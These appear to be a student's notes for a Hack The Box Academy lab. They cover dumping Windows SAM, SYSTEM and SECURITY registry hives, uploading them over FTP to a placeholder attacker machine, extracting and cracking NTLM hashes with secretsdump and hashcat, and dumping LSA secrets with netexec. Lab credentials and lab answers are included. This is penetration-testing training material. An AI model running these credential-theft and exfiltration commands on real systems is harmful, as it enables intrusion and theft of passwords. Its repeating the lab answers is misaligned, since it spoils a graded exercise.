# [[Attacking SAM, SYSTEM and SECURITY]] | [[Windows File Transfer Methods]] | [[FTP Uploads]]

### Where is the SAM database located in the Windows registry? (Format: *\*\*\*\\*\*\*)

**HKLM\SAM**
### Apply the concepts taught in this section to obtain the password to the ITbackdoor user account on the target. Submit the clear-text password as the answer.

```shell
sudo python3 -m pyftpdlib --port 21 --write
```
![[Screenshot 2026-05-07 at 17.09.37.png]]

```shell
xfreerdp /u:Bob /p:HTB_@cademy_stdnt! /v:<target ip address>
```
![[Pasted image 20260507171135.png]]
```cmd
reg.exe save hklm\sam C:\sam.save  
reg.exe save hklm\system C:\system.save  
reg.exe save hklm\security C:\security.save\
```

```Powershell
(New-Object Net.WebClient).UploadFile('<ftp://<Attacker machine>/sam.save>', 'C:\sam.save')

(New-Object Net.WebClient).UploadFile('<ftp://<Attacker machine>/system.save>', 'C:\system.save')

(New-Object Net.WebClient).UploadFile('<ftp://<Attacker machine>/security.save>', 'C:\security.save')
```
![[Screenshot 2026-05-08 at 00.52.45.png]]

```shell
/usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL > hashall.txt
```

```shell
hashcat -a 0 -m 1000 c02478537b9727d391bc80011c2e2321 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
```
![[Screenshot 2026-05-08 at 00.55.30.png]]

**matrix**
### Dump the LSA secrets on the target and discover the credentials stored. Submit the username and password as the answer. (Format: username:password, Case-Sensitive)

```shell
netexec smb 10.129.202.137 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
![[Screenshot 2026-05-08 at 01.01.07.png]]
